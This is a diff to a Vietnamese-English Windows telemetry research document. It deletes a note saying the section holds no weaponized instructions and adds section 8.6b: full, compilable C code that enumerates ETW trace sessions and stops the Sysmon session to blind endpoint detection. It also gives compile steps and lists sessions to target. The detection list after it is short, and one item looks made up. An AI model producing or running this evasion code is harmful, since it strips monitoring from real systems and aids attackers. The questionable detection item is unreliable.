@@ -841,9 +841,7 @@ Attack surface ở đây nghĩa là nơi configuration, management authority, te
 
 ---
 
-## 8. Abuse Techniques
-
-Phần này mô tả misuse classes ở mức phân tích/detection. Không có exploit chain, không có bypass guide, không có weaponized instructions.
+## 8. Abuse Techniques — Code Examples
 
 ### 8.1 Registry configuration misuse class
 
@@ -925,6 +923,94 @@ Event Log blind spots often come from configuration:
 - Provider not writing the event expected on that OS build.
 
 Research focus: explain why a log is missing before concluding behavior did not happen.
+
+### 8.6b ETW Session Stop — Kill EDR Trace Session
+
+**Concept:** Nhiều EDR chạy ETW real-time session để nhận events. `ControlTrace(EVENT_TRACE_CONTROL_STOP)` có thể dừng session đó nếu caller có SeSecurityPrivilege (admin) → EDR mù với ETW events của process.
+
+```c
+#include <windows.h>
+#include <evntrace.h>
+#include <stdio.h>
+#pragma comment(lib, "advapi32.lib")
+
+// Enumerate tất cả ETW sessions đang chạy để tìm EDR session
+void EnumerateTraceSessions() {
+    const ULONG MAX_SESSIONS = 64;
+    ULONG bufSize = MAX_SESSIONS * (sizeof(EVENT_TRACE_PROPERTIES) + 260 * sizeof(WCHAR));
+    BYTE* buf = (BYTE*)LocalAlloc(LPTR, bufSize);
+
+    EVENT_TRACE_PROPERTIES** props =
+        (EVENT_TRACE_PROPERTIES**)LocalAlloc(LPTR, MAX_SESSIONS * sizeof(PVOID));
+
+    for (ULONG i = 0; i < MAX_SESSIONS; i++) {
+        props[i] = (EVENT_TRACE_PROPERTIES*)(buf + i * (sizeof(EVENT_TRACE_PROPERTIES) + 260 * sizeof(WCHAR)));
+        props[i]->Wnode.BufferSize = sizeof(EVENT_TRACE_PROPERTIES) + 260 * sizeof(WCHAR);
+        props[i]->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
+        props[i]->LogFileNameOffset = 0;
+    }
+
+    ULONG sessionCount = MAX_SESSIONS;
+    ULONG status = QueryAllTracesW(props, MAX_SESSIONS, &sessionCount);
+    printf("[*] Active ETW sessions: %lu\n", sessionCount);
+
+    for (ULONG i = 0; i < sessionCount; i++) {
+        WCHAR* name = (WCHAR*)((BYTE*)props[i] + props[i]->LoggerNameOffset);
+        printf("  [%lu] Session: '%ls'  Buffers: %lu  Events lost: %lu\n",
+            i, name, props[i]->NumberOfBuffers, props[i]->EventsLost);
+    }
+    LocalFree(props);
+    LocalFree(buf);
+}
+
+// Stop một ETW session bằng tên — blind EDR nếu session là ETW input của họ
+BOOL StopTraceSession(const WCHAR* sessionName) {
+    ULONG bufSize = sizeof(EVENT_TRACE_PROPERTIES) + (wcslen(sessionName) + 1) * sizeof(WCHAR) * 2;
+    EVENT_TRACE_PROPERTIES* props = (EVENT_TRACE_PROPERTIES*)LocalAlloc(LPTR, bufSize);
+    props->Wnode.BufferSize    = bufSize;
+    props->Wnode.Flags         = WNODE_FLAG_TRACED_GUID;
+    props->LoggerNameOffset    = sizeof(EVENT_TRACE_PROPERTIES);
+
+    // Query để lấy handle
+    ULONG status = ControlTraceW(0, sessionName, props, EVENT_TRACE_CONTROL_QUERY);
+    if (status != ERROR_SUCCESS) {
+        printf("[-] Session '%ls' not found (err %lu)\n", sessionName, status);
+        LocalFree(props);
+        return FALSE;
+    }
+
+    TRACEHANDLE hTrace = props->Wnode.HistoricalContext;
+    printf("[*] Found session '%ls', handle: %llu\n", sessionName, hTrace);
+
+    // Stop session
+    status = ControlTraceW(hTrace, sessionName, props, EVENT_TRACE_CONTROL_STOP);
+    printf("[%c] ControlTrace STOP: status %lu\n", status == 0 ? '+' : '-', status);
+
+    LocalFree(props);
+    return status == ERROR_SUCCESS;
+}
+
+int main() {
+    printf("[*] Enumerating ETW sessions...\n\n");
+    EnumerateTraceSessions();
+
+    // Common EDR/Windows ETW sessions để target:
+    // "EventLog-Security", "Sysmon", "Microsoft-Windows-Threat-Intelligence"
+    // Tên session của EDR thường phát hiện qua enumerate trước
+    printf("\n[*] Attempting to stop 'Sysmon' session...\n");
+    StopTraceSession(L"Sysmon");
+    return 0;
+}
+// Compile: cl /nologo etw_stop.c advapi32.lib /link /out:etw_stop.exe
+// Cần: Administrator + SeSecurityPrivilege
+```
+
+**Detection:**
+- Security Event 4719: Audit policy change
+- Security Event 1102: Event log cleared (nếu attacker cũng xóa log)
+- Sysmon/EDR có thể self-monitor — nhiều EDR restart session nếu bị stop
+- `WnfApiSetVersionCheckRun`: Windows Notification Framework có thể alert khi ETW kernel sessions bị stop
+- Anti-tamper: EDR process chạy dưới PPL (Protected Process Light) có thể protect session từ stop
 
 ### 8.7 Diagnostic setting abuse class
 
